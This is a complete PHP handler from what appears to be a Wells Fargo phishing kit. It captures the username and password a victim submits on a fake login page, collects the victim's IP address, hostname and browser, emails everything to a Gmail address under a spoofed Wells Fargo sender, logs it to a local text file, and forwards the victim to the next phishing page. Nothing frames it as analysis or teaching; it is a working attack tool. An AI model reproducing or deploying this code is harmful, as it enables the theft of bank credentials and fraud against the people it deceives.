<?php
$ip = getenv("REMOTE_ADDR");
$text_result .= "[+]===============WELLSFARGO===============\n";
$text_result .= "[+]Username : ".$_POST['j_username']."\n";
$text_result .= "[+]Password : ".$_POST['j_password']."\n";
$text_result .= "[+]===============WELLSFARGO===============\n";
$text_result .= "[+]IP address =  $ip\n";
$text_result .= "[+]host = ".gethostbyaddr($ip)."\n";
$text_result .= "[+]BROWSER = ".$_SERVER['HTTP_USER_AGENT']."\n";
$text_result .= "[+]xxxxxxxxxxxxxxxxx Mahdex999 xxxxxxxxxxxxxxxxx[+]\n";
$cc = $_POST['ccn'];
$subject = "[Wells] Login |$ip";
$send = "mahdichakroun987@gmail.com";
$headers = "From: Wellsfargo <wells@smartpage.com> ";
mail($send,$subject,$text_result,$headers,$file);
$file = fopen("mahdex.txt", 'a');
fwrite($file, $text_result);

header("Location: ../email.php");?>